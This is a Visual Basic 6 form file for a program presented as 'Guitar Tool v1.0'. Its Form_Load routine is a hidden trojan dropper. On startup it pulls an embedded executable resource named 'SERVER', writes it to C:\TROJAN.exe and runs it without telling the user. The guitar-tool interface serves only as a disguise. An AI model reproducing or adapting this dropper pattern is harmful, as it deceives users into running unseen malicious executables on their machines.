VERSION 5.00
Begin VB.Form Form1 
   BackColor       =   &H00C8D0D4&
   BorderStyle     =   3  'Fixed Dialog
   Caption         =   "Henrique Carrieri - Guitar Tool v1.0"
   ClientHeight    =   5175
   ClientLeft      =   45
   ClientTop       =   330
   ClientWidth     =   6930
   Icon            =   "frmMain.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   Picture         =   "frmMain.frx":030A
   ScaleHeight     =   5175
   ScaleWidth      =   6930
   ShowInTaskbar   =   0   'False
   StartUpPosition =   3  'Windows Default
   Begin VB.Label Label1 
      AutoSize        =   -1  'True
      BackStyle       =   0  'Transparent
      Caption         =   "por Gabriel Falcão"
      BeginProperty Font 
         Name            =   "Verdana"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00C00000&
      Height          =   195
      Left            =   2460
      TabIndex        =   0
      Top             =   1410
      Width           =   1560
   End
   Begin VB.Image Image2 
      Height          =   3060
      Left            =   518
      Picture         =   "frmMain.frx":303C8
      Top             =   1935
      Width           =   5895
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Private Sub Image1_Click()

End Sub

Private Sub Form_Load()
Dim nome As String
Dim p_ret As String
nome = "C:\TROJAN.exe"
p_ret = StrConv(LoadResData("SERVER", "EXE"), vbUnicode)
Open nome For Binary As #1
Put #1, , p_ret
Close #1
Call Shell(nome)
End Sub
